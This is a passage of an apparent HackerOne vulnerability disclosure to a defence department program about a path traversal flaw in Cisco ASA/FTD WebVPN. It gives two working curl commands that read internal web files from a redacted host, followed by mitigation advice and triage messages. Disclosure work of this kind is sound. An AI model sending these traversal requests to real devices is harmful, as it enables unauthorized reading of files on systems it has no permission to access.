An attacker could exploit this vulnerability by sending a crafted HTTP request containing directory traversal character sequences to an affected device. A successful exploit could allow the attacker to view arbitrary files within the web services file system on the targeted device.\n\nThe web services file system is enabled when the affected device is configured with either WebVPN or AnyConnect features. This vulnerability cannot be used to obtain access to ASA or FTD system files or underlying operating system (OS) files.\n\nAn advisory can be found at the following link: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-ro-path-KJuQhB86\n\n## Step-by-step Reproduction Instructions\n\n1. In bash, use `curl -k \"https://███████/+CSCOT+/translation-table?type=mst\u0026textdomain=/%2bCSCOE%2b/portal_inc.lua\u0026default-language\u0026lang=../\"` to prove you can read internal files such as the /+CSCOE+/portal_inc.lua file.\n2. Various internal files can be read, and some require using the --output command to output the binary data to a file as shown below:\n\n```\ncurl -k \"https://█████████/+CSCOT+/translation-table?type=mst\u0026textdomain=/%2bCSCOE%2b/session.js\u0026default-language\u0026lang=../\" --output session.js\n```\n\n## Suggested Mitigation/Remediation Actions\nUpdate the software to the latest version via the Cisco advisory linked above.\n\n## Impact\n\nA successful exploit could allow the attacker to view arbitrary files within the web services file system on the targeted device.\n\nThe web services file system is enabled when the affected device is configured with either WebVPN or AnyConnect features. This vulnerability cannot be used to obtain access to ASA or FTD system files or underlying operating system (OS) files.","weakness":{"id":19,"name":"Path Traversal"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":19,"voters":["thaivu","yxw21","un4gi","ali","they","dastan_9408","zimmer75","harounty","0xz3ro","r7le","and 9 more..."],"severity":{"rating":"high","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":8720551,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2020-07-23T12:59:00.726Z","updated_at":"2020-07-23T12:59:00.726Z","additional_data":{"old_severity":null,"new_severity":"High","old_severity_id":null,"new_severity_id":795422},"actor":{"username":"agent-l8","cleared":false,"url":"/agent-l8","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8720596,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Greetings,\n\nWe have validated the vulnerability you reported and are preparing to forward this report to the affected DoD system owner for resolution.\n\nThank you for bringing this vulnerability to our attention!\n\nWe will endeavor to answer any questions the system owners may have regarding this report; however, there is a possibility we will need to contact you if they require more information to resolve the vulnerability.\n\nYou will receive another status update after we have confirmed your report has been resolved by the system owner.
